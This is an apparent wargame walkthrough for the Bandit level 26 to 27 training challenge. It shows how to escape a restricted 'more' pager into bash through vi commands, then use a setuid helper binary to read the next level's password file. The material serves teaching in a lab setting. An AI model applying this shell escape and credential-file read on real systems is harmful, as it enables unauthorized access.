Description:
Good job getting a shell! Now hurry and grab the password for bandit27!

---

Commands you may need to solve this level:
ssh, cat, more, vi, ls, id, pwd

---

Solution:
# You once again login to user bandit26 but as you can see, there is still no way to access an operative shell
# exploit the "more" trick and set out shell to bash
~:set shell=bash
~:shell
# now you have full access to an ordinary terminal as user bandit26
./bandit27-do
# It turns out that this file is a setuid binary and thus we utilize it as one
./bandit27-do cat /etc/bandit_pass/bandit27
